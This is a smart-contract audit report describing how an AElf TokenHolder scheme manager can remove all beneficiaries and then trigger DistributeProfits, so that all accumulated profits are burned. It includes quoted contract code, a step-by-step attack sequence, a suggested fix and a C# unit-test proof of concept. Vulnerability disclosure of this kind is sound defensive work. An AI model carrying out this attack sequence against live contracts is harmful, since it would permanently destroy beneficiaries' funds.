# Audit Report

## Title
Scheme Manager Can Permanently Destroy All Accumulated Profits by Removing Beneficiaries Before Distribution

## Summary
A malicious TokenHolder scheme manager can remove all beneficiaries immediately before calling `DistributeProfits`, reducing the scheme's `TotalShares` to zero. When distribution occurs with zero total shares, the Profit contract automatically burns all accumulated profits instead of distributing them, permanently destroying funds that legitimate beneficiaries were entitled to claim.

## Finding Description

TokenHolder schemes are created with `CanRemoveBeneficiaryDirectly = true` hardcoded into the scheme creation logic, allowing the scheme manager unrestricted removal of beneficiaries at any time. [1](#0-0) 

The `RemoveBeneficiary` function in TokenHolderContract can only be called by the scheme manager (verified through `GetValidScheme(Context.Sender)`), and forwards the removal request to the underlying Profit contract. [2](#0-1) 

In the Profit contract, the `RemoveBeneficiary` function calls `RemoveProfitDetails` and subtracts the removed shares from the scheme's `TotalShares`. [3](#0-2) 

The `RemoveProfitDetails` function removes ALL beneficiary details when `CanRemoveBeneficiaryDirectly` is true, with no restrictions. [4](#0-3) 

**Critical Flaw:** When `DistributeProfits` is called and `totalShares <= 0`, the contract invokes `BurnProfits` instead of distributing to beneficiaries. [5](#0-4) 

The `BurnProfits` function permanently destroys the tokens by calling the Token contract's `Burn` method. [6](#0-5) 

The scheme manager can also call `DistributeProfits` in the TokenHolder contract, giving them complete control over both removal and distribution operations. [7](#0-6) 

**Attack Sequence:**
1. Manager creates a TokenHolder scheme (any user can create and become manager)
2. Legitimate beneficiaries register and lock tokens
3. Profits accumulate in the scheme's virtual address
4. Manager calls `RemoveBeneficiary` for each beneficiary, reducing `TotalShares` to 0
5. Manager calls `DistributeProfits`
6. Because `TotalShares = 0`, `BurnProfits` is invoked
7. All accumulated profits are permanently burned
8. Beneficiaries lose their entitled distributions with no recovery mechanism

The scheme manager is a user-controlled role, not a trusted protocol role, as evidenced by the scheme creation setting the manager to `Context.Sender`: [8](#0-7) 

## Impact Explanation

**HIGH Severity** - This vulnerability results in:

1. **Complete Permanent Fund Loss**: All accumulated profits in the scheme are irreversibly destroyed through token burning, with no recovery mechanism.

2. **Supply Deflation**: The total token supply permanently decreases as tokens are burned rather than distributed.

3. **Beneficiary Harm**: Legitimate users who staked tokens and were entitled to profit distributions lose their entire share without recourse.

4. **Protocol Integrity Violation**: The core dividend distribution mechanism can be weaponized to destroy rather than distribute funds, breaking the fundamental trust model of profit-sharing schemes.

The impact is maximized because:
- The attack affects ALL accumulated profits in one action
- No governance or time-delay protections exist
- The scheme manager controls both critical functions (removal and distribution)
- The burning is permanent and irreversible

## Likelihood Explanation

**MEDIUM-HIGH Likelihood** - The attack is realistic because:

1. **Attacker Profile**: The scheme manager is a user-created role (typically DApp operators), not a trusted protocol role like Parliament or consensus contracts. Any entity can create a scheme and become its manager.

2. **Low Attack Complexity**: Only two function calls are required:
   - `RemoveBeneficiary` for each beneficiary (can be sequential or batched)
   - `DistributeProfits`
   
   Both are directly accessible to the scheme manager with no additional approvals.

3. **No Protective Mechanisms**:
   - No minimum `TotalShares` requirement before distribution
   - No timelock or delay between removal and distribution
   - No governance approval for mass beneficiary removal
   - No economic disincentive or penalty

4. **Realistic Threat Scenarios**:
   - Malicious DApp operator executing an exit scam
   - Compromised manager keys
   - Insider attack to harm competitors or users
   - Disgruntled or departing operators

5. **Detection Difficulty**: The removal transactions appear legitimate and authorized. The attack would only be detected after profits are already burned.

## Recommendation

Implement protective mechanisms to prevent profit burning when beneficiaries exist or have existed:

1. **Add minimum shares validation**: Before allowing distribution with zero shares, check if beneficiaries were recently removed and require a time delay or governance approval.

2. **Implement timelock**: Add a mandatory delay period between beneficiary removal and profit distribution to allow detection and intervention.

3. **Restrict CanRemoveBeneficiaryDirectly**: Do not hardcode this flag to `true` for TokenHolder schemes. Instead, make it configurable with appropriate governance controls.

4. **Add emergency recovery**: Implement a mechanism to recover profits if zero-share distribution is detected, redirecting funds to a safety address instead of burning.

5. **Emit warnings**: Add events that clearly indicate when all beneficiaries are removed from a scheme with pending profits.

Example fix for the distribution logic:

```csharp
if (input.Period < 0)
    return BurnProfits(input.Period, profitsMap, scheme, profitsReceivingVirtualAddress);

// Prevent burning if TotalShares is 0 but profits exist
if (totalShares <= 0)
{
    Assert(profitsMap.Values.All(v => v == 0), 
        "Cannot distribute profits: no beneficiaries remain in scheme.");
    return new Empty();
}
```

## Proof of Concept

```csharp
[Fact]
public async Task MaliciousManager_BurnsAllProfits_ByRemovingAllBeneficiaries()
{
    // Setup: Create scheme as malicious manager
    await TokenHolderContractStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF"
    });

    // Contribute initial profit to create scheme
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = Starter,
        Symbol = "ELF",
        Amount = 1000
    });

    var scheme = await TokenHolderContractStub.GetScheme.CallAsync(Starter);
    var profitScheme = await ProfitContractStub.GetScheme.CallAsync(scheme.SchemeId);

    // Setup: Multiple beneficiaries register and lock tokens
    var user1Stub = GetTokenHolderContractTester(UserKeyPairs[0]);
    var user2Stub = GetTokenHolderContractTester(UserKeyPairs[1]);
    
    await user1Stub.RegisterForProfits.SendAsync(new RegisterForProfitsInput
    {
        SchemeManager = Starter,
        Amount = 1000
    });
    
    await user2Stub.RegisterForProfits.SendAsync(new RegisterForProfitsInput
    {
        SchemeManager = Starter,
        Amount = 2000
    });

    // Large profits accumulate
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = Starter,
        Symbol = "ELF",
        Amount = 100000  // 100,000 ELF accumulated
    });

    var balanceBefore = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = profitScheme.VirtualAddress,
        Symbol = "ELF"
    })).Balance;
    balanceBefore.ShouldBe(101000); // 1000 + 100000

    // ATTACK: Manager removes all beneficiaries
    await TokenHolderContractStub.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = UserAddresses[0],
        Amount = 0  // Remove completely
    });
    
    await TokenHolderContractStub.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = UserAddresses[1],
        Amount = 0  // Remove completely
    });

    // Verify TotalShares is now 0
    var schemeAfterRemoval = await ProfitContractStub.GetScheme.CallAsync(scheme.SchemeId);
    schemeAfterRemoval.TotalShares.ShouldBe(0);

    // ATTACK: Manager distributes profits with zero shares
    await TokenHolderContractStub.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeManager = Starter
    });

    // VERIFICATION: All profits were burned (balance = 0)
    var balanceAfter = (await TokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Owner = profitScheme.VirtualAddress,
        Symbol = "ELF"
    })).Balance;
    balanceAfter.ShouldBe(0);  // All 101,000 ELF burned permanently

    // Beneficiaries cannot claim anything - funds permanently lost
    var user1Profits = await TokenHolderContractStub.GetProfitsMap.CallAsync(new ClaimProfitsInput
    {
        SchemeManager = Starter,
        Beneficiary = UserAddresses[0]
    });
    user1Profits.Value.Count.ShouldBe(0);  // No profits claimable
}
```

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L20-25)
```csharp
        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L70-84)
```csharp
    public override Empty RemoveBeneficiary(RemoveTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);

        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            Beneficiary = input.Beneficiary,
            SchemeId = scheme.SchemeId
        }).Details.Single();
        var lockedAmount = detail.Shares;
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L131-143)
```csharp
    public override Empty DistributeProfits(DistributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager, true);
        Assert(Context.Sender == Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName) ||
               Context.Sender == input.SchemeManager, "No permission to distribute profits.");
        var distributeProfitsInput = new Profit.DistributeProfitsInput
        {
            SchemeId = scheme.SchemeId,
            Period = scheme.Period
        };
        if (input.AmountsMap != null && input.AmountsMap.Any()) distributeProfitsInput.AmountsMap.Add(input.AmountsMap);

        State.ProfitContract.DistributeProfits.Send(distributeProfitsInput);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L224-262)
```csharp
    public override Empty RemoveBeneficiary(RemoveBeneficiaryInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        Assert(input.Beneficiary != null, "Invalid Beneficiary address.");

        var scheme = State.SchemeInfos[input.SchemeId];

        Assert(scheme != null, "Scheme not found.");

        var currentDetail = State.ProfitDetailsMap[input.SchemeId][input.Beneficiary];

        if (scheme == null || currentDetail == null) return new Empty();

        Assert(Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager or token holder contract can add beneficiary.");

        var removedDetails = RemoveProfitDetails(scheme, input.Beneficiary, input.ProfitDetailId);

        foreach (var (removedMinPeriod, removedShares) in removedDetails.Where(d => d.Key != 0))
        {
            if (scheme.DelayDistributePeriodCount > 0)
            {
                for (var removedPeriod = removedMinPeriod;
                     removedPeriod < removedMinPeriod.Add(scheme.DelayDistributePeriodCount);
                     removedPeriod++)
                {
                    if (scheme.CachedDelayTotalShares.ContainsKey(removedPeriod))
                    {
                        scheme.CachedDelayTotalShares[removedPeriod] =
                            scheme.CachedDelayTotalShares[removedPeriod].Sub(removedShares);
                    }
                }
            }
        }

        State.SchemeInfos[input.SchemeId].TotalShares = scheme.TotalShares.Sub(removedDetails.Values.Sum());

        return new Empty();
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L318-324)
```csharp
        // remove all removalbe profitDetails.
        // If a scheme can be cancelled, get all available profitDetail.
        // else, get those available and out of date ones.
        var detailsCanBeRemoved = scheme.CanRemoveBeneficiaryDirectly
            ? profitDetails.Details.Where(d => !d.IsWeightRemoved).ToList()
            : profitDetails.Details
                .Where(d => d.EndPeriod < scheme.CurrentPeriod && !d.IsWeightRemoved).ToList();
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L485-486)
```csharp
        if (input.Period < 0 || totalShares <= 0)
            return BurnProfits(input.Period, profitsMap, scheme, profitsReceivingVirtualAddress);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L546-551)
```csharp
                State.TokenContract.Burn.Send(new BurnInput
                {
                    Amount = amount,
                    Symbol = symbol
                });
                distributedProfitsInfo.AmountsMap.Add(symbol, -amount);
```
